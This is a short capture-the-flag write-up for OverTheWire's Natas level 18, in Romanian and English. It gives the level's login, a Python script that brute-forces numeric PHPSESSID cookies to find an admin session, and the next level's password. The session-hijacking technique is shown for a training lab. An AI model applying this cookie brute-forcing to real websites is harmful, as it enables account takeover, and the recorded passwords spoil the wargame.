
# General info

Username: natas18
Password: 6OG1PbKdVjyBlpxgD4DDbRG6ZLlCGgCJ
URL:      http://natas18.natas.labs.overthewire.org

# Special code section

```py
import requests


for i in range(0, 650):
    response = requests.get(
        url="http://natas18.natas.labs.overthewire.org/index.php",
        auth=("natas18", "6OG1PbKdVjyBlpxgD4DDbRG6ZLlCGgCJ"),
        cookies={
            "PHPSESSID" : f"{i}"
        },
        params={
            "debug" : "sa fie",
            # "admin": "1"
        }
    )

    if "You are logged in as a regular user" not in response.text:
        print(i)
        print(response.text)

        # 119
        # tnwER7PdfWkxsG4FNWUtoAZ9VyZTJqJr
```

Cred ca tehnica se numeste _session hijacking_.
Basically, am vazut ca numarul de sesiuni e destul de mic, iar `$_SESSION["admin"] = 1` nu exista nicaieri.
Asta m-a facut sa ma intreb daca nu exista deja o sesiune pe care o pot accesa.
Codul se baza pe un `PHPSESSID` cookie cu o valoare numerica pentru a-ti da _sesiunea_.
Which means ca puteam face brute force pe toate sesiunile si sa sper ca una va fi de admin.
That worked out pretty good!
